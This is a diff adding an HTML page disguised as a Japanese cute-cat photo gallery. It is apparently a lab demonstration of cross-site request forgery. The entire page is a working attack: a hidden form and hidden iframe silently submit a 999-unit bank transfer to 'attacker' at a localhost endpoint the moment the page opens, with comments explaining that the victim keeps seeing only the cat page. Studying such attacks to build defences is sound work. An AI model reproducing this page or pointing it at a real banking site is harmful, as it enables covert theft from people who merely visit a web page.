@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head><meta charset="utf-8"><title>かわいい猫</title></head>
+<body>
+  <h1>かわいい猫の写真集🐱</h1>
+  <p>(表向きは普通のページ)</p>
+
+  <!-- 非表示の iframe を用意。フォームの submit 先をこの iframe に向ければ、
+       応答ページに遷移してもユーザーから見える主画面は猫のまま -->
+  <iframe name="sink" style="display:none"></iframe>
+
+  <!-- ★ 裏で銀行サイトへ送金リクエストを自動送信 (target=sink で iframe に流し込む) -->
+  <form id="f" action="http://localhost:4000/transfer" method="POST" target="sink" style="display:none">
+    <input name="to" value="attacker">
+    <input name="amount" value="999">
+  </form>
+  <script>
+    // ページを開いた瞬間に submit
+    document.getElementById('f').submit();
+  </script>
+</body>
+</html>
